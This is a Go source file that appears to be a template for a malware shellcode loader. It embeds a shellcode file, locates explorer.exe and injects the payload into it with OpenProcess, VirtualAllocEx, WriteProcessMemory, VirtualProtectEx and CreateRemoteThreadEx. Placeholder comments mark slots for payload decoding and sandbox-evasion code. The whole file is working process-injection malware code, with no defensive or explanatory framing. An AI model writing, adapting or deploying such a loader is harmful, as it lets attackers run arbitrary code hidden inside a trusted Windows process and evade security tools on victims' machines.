package main

import (
	_ "embed"
	"fmt"
	"unsafe"

	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	//__IMPORT__
)

//go:embed shellcode
var shellcode []byte

//__DECODE__

func main() {
	//__SANDBOX__
	processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == "explorer.exe" {
			pid = process.Pid()
			break
		}
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")
	pHandle, _, _ := OpenProcess.Call(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0,
		uintptr(uint32(pid)),
	)
	addr, _, _ := VirtualAllocEx.Call(pHandle, 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	fmt.Println("ok")
	_, _, _ = WriteProcessMemory.Call(pHandle, addr, (uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(pHandle, addr, uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = CreateRemoteThreadEx.Call(pHandle, 0, 0, addr, 0, 0, 0)
	_, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))
}
